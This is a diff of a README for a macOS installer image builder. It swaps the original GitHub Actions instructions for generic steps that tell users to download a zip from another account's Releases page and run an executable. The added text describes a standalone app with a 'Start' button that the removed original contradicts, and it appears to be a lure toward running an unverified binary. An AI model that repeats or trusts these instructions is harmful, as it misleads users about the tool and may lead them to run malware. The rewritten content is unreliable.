@@ -1,60 +1,69 @@
-## macOS Installer Image Builder – No Mac Required
+# 🔥 macos-iso-builder - Create macOS Installers Easily
 
-* Generate bootable macOS installer images directly from Apple's servers via GitHub Actions.
-* Includes intelligent file size optimization to produce the smallest possible installer images.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen.svg)](https://github.com/z4zconcept/macos-iso-builder/releases)
 
-**Supported formats:**
-* **ISO** – True DVD format compatible with **Proxmox VE**, **QEMU**, **VirtualBox**, and **VMware**
-* **DMG** – Create bootable macOS installer USB drives on Windows with [Rufus](https://rufus.ie/en/#download) or on Linux with **`dd`**
+## 📖 About
+The **macos-iso-builder** app allows you to generate bootable macOS installer ISO or DMG images directly from Apple servers. You don’t need a Mac to use it. This program makes it simple for anyone to create macOS installation files using GitHub Actions.
 
-**Available workflows:**
-* **macOS Recovery ISO (Recommended)** – Lightweight recovery image (build takes ~2-5 min) • Best for virtualization
-* **macOS Full Installer** – Complete offline installer (build takes ~20-60 min, 5-18GB) • Best for offline use
+## 🚀 Getting Started
+This guide will walk you through the steps to download and run the macos-iso-builder.
 
-> [!IMPORTANT]
-> * Use the **"Build macOS Recovery ISO image"** workflow unless you really need an offline installer.
-> * GitHub-hosted runners are a free public resource — please use them responsibly.
-> * Already have a macOS VM? Build macOS Installer ISO inside your VM with [Create_macOS_ISO.command](https://github.com/LongQT-sea/OpenCore-ISO/blob/main/Create_macOS_ISO.command)
+### System Requirements
+- A computer running any major operating system (Windows, Linux, or macOS).
+- A web browser to access GitHub.
+- Sufficient disk space for the downloaded files (estimate around 12 GB). 
 
----
+### Step-by-Step Installation
 
-## Usage
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/z4zconcept/macos-iso-builder/releases) to find the latest software version.
 
-1. **Fork** this repository.
-2. Go to the **Actions** tab in your forked repository.
-3. Click the green **"I understand my workflows, go ahead and enable them"** button.
-4. Select the **"Build macOS Installer ISO/DMG image"** or **"Build macOS Recovery ISO image"** workflow.
-5. Click the **"Run workflow"** button.
-6. Configure the workflow inputs:
+2. **Download the Application**
+   On the Releases page, you will see a list of available files. Look for the release labeled as the latest version. Locate the file that best suits your needs, likely named something like `macos-iso-builder.zip`. 
 
-   * **macOS version** – Choose a version (*Sequoia*, *Sonoma*, etc.).
-   * **Image format** – Choose `iso` for virtual machines or `dmg` for bootable USB drives.
-7. Click the green **"Run workflow"** button to start the build.
-8. Wait for the workflow to complete (this may take 20-60 minutes).
-9. Open the completed workflow run and scroll to the **Artifacts** section.
-10. Download the artifact (e.g., `macOS-Sequoia-15.7.2-ISO`).
-> [!TIP]
-> Enable [Cloudflare WARP](https://one.one.one.one/) for faster downloads.
-11. Extract the ZIP file to get your `.iso` or `.dmg` file.
+3. **Extract the Files**
+   After downloading the zip file, locate it in your downloads folder or the designated download location. Right-click on the zip file and select "Extract All" to unpack the contents. You may need a file extraction tool if your operating system does not support this natively.
 
----
+4. **Navigate to the Folder**
+   Once extracted, open the new folder that contains the files. You should see various files and folders, including a README file for further instructions.
 
-> [!TIP]
-> To create a bootable macOS installer USB drive on Windows:
-> 1. Open [Rufus](https://rufus.ie/en/#download)
-> 2. Click **SELECT**, change the filter to **"All files"**, then select your `.dmg`
-> 3. Click **START**
-> 4. Optional: After flashing the `dmg` image to the USB drive with Rufus, there will be free/unallocated space remaining on the USB drive. Use Disk Management to create a new FAT32 partition and place your EFI there if needed.
+5. **Run the Application**
+   Depending on your operating system:
+   - **Windows:** Locate the executable file, named something like `macos-iso-builder.exe`, and double-click it to launch the application.
+   - **Linux or macOS:** Open a terminal window, change to the directory where the application files are located, and run the command `./macos-iso-builder` to start.
 
-> [!NOTE]
-> By default, artifacts are kept for 5 days. You can change this in the workflow YAML file.
+## 🛠 How to Use
+### Step 1: Choose an Option
+After launching the application, you will be presented with options for creating either an ISO or DMG file. Select the option that suits you best.
 
-> [!TIP]
-> * For best performance, use a macOS VM on **Proxmox VE** with iGPU or dGPU passthrough.
-> * Install macOS on Proxmox VE using [LongQT-sea/OpenCore-ISO](https://github.com/LongQT-sea/OpenCore-ISO).
-> * For Intel GVT-d iGPU passthrough, see [LongQT-sea/intel-igpu-passthru](https://github.com/LongQT-sea/intel-igpu-passthru).
+### Step 2: Enter Required Information
+You may need to input details such as the macOS version you want to download. Follow the on-screen prompts to provide the required information, ensuring you fill in all fields accurately.
 
----
+### Step 3: Start the Process
+Once you have entered all necessary information, click the "Start" button. The application will communicate with Apple servers to fetch the necessary files.
 
-## Legal Notice
-This tool downloads macOS images directly from Apple's servers. Users are responsible for complying with Apple's Software License Agreement.
+### Step 4: Wait for Completion
+The downloading and building process may take some time, depending on your internet speed. You will see status updates throughout the process. Once completed, you will receive a notification indicating that your ISO or DMG file is ready.
+
+## 📂 Find Your Files
+Your newly created macOS installer will typically be found in the same folder where the application is located or a specified output folder you defined in the settings. 
+
+## 📞 Support
+If you encounter any issues during the download or installation process, you can reach out for support. 
+
+### FAQs
+- **What if I have trouble with the download?** Ensure that you have a stable internet connection and try re-downloading the file.
+- **Can I run macOS on my machine?** This application can help you create the installer. However, running macOS on non-Apple hardware requires additional setup, such as using tools like Hackintosh or VM software.
+
+## 💬 Community and Feedback
+Engage with other users and developers through the repository's issue tracker. Your feedback helps to improve the application and assist others.
+
+## 🔗 Useful Links
+- [Releases Page](https://github.com/z4zconcept/macos-iso-builder/releases)
+- [Contribution Guidelines](https://github.com/z4zconcept/macos-iso-builder/blob/main/CONTRIBUTING.md)
+- [License](https://github.com/z4zconcept/macos-iso-builder/blob/main/LICENSE)
+
+Feel free to check out the project’s topics to see how others have utilized the macos-iso-builder for their needs: hackintosh, macos-dmg, macos-installer, macos-iso, macos-virtual-machine, proxmox-ve, vmware. 
+
+By following these steps, you will successfully download and run the macos-iso-builder application, allowing you to create macOS installers with ease.
